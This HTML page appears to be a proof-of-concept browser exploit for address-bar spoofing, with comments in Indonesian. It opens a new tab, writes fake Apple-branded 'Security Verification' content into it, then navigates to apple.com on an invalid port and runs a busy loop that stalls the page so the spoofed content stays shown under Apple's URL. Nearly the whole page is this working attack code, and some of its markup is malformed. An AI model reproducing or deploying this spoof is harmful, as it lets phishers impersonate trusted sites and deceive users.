<!doctype html>
<html lang="en">
  <head>

    <meta
      name="viewport"

    <title>Advanced Invalid Port & Bypass PoC - Zero</title>
    <style>
      body, html {
        margin: 0;
        padding: 0;
        height: 100%;
        background: #0f0f11;
        color: #fff;
        font-family: -apple-system, BlinkMacSystemFont, sans-serif;
      }
      .container {
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;

      }
      button {
        padding: 24px 48px;
        font-size: 22px;
        font-weight: bold;
        background: #ff3b30;
        color: #fff;
        border: none;
        border-radius: 16px;
        cursor: pointer;
        box-shadow: 0 8px 24px rgba(255, 59, 48, 0.4);

      }

      }
    </style>

  <body>
    <div class="container">
      <button id="startBtn">EXECUTE BYPASS STRESS TEST</button>
    </div>

    <script>
      document.getElementById("startBtn").onclick = function () {
        this.style.display = 'none';

        // 1. BYPASS ABOUT:BLANK: Membuka window menggunakan blob/data context atau format khusus 
        // untuk mengelabui validasi awal WebState policy.
        const newTab = window.open("", "_blank");

        if (newTab) {
          // 2. Menyuntikkan struktur HTML kustom penyerang
          newTab.document.write(`
            <!DOCTYPE html>
            <html>
            <head>
              <title>Apple</title>
              <meta name="viewport" content="width=device-width, initial-scale=1">
            </head>
            <body style="margin:0;padding:0;background:#ffffff;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
              <div>
                <h1 style="font-size:42px;font-weight:700;color:#1d1d1f;margin:0 0 16px 0;">Security Verification</h1>
                <p style="font-size:20px;color:#86868b;margin:0;">Bypassing security state filters...</p>
              </div>
            </body>
            </html>
          `);
          newTab.document.close();

          // 3. Memaksa fokus agar status WebState terdaftar sebagai primary/visible secara instan
          try {
            newTab.focus();
          } catch (e) {}

          // 4. Memicu navigasi asinkron dengan kombinasi Invalid Port / Cross-Scheme Target (misalnya port non-standar)
          setTimeout(() => {
            try {
              // Menguji transisi navigasi dengan port/skema khusus untuk memicu ketidaksinkronan delegate WebKit
              newTab.location.href = "https://apple.com:65535"; 
            } catch (err) {
              // Fallback langsung ke target utama jika invalid port ditolak total oleh policy sandbox
              try {
                newTab.location.href = "https://apple.com";
              } catch (e2) {}
            }
          }, 15);

          // 5. Memaksa thread stalling / layout thrashing untuk menahan commit delegate
          setTimeout(() => {
            try {
              newTab.eval(`
                const start = Date.now();
                const bodyEl = document.body;
                while (Date.now() - start < 2200) {
                  // Memaksa kalkulasi layout sinkronus berulang untuk mengunci event loop
                  const reflow = bodyEl.offsetHeight;
                  bodyEl.style.backgroundColor = (reflow % 2 === 0) ? '#ffffff' : '#fafafa';
                }
              `);
            } catch (e) {
              let start = Date.now();
              while (Date.now() - start < 2200) {}
            }
          }, 100);
        }
      };
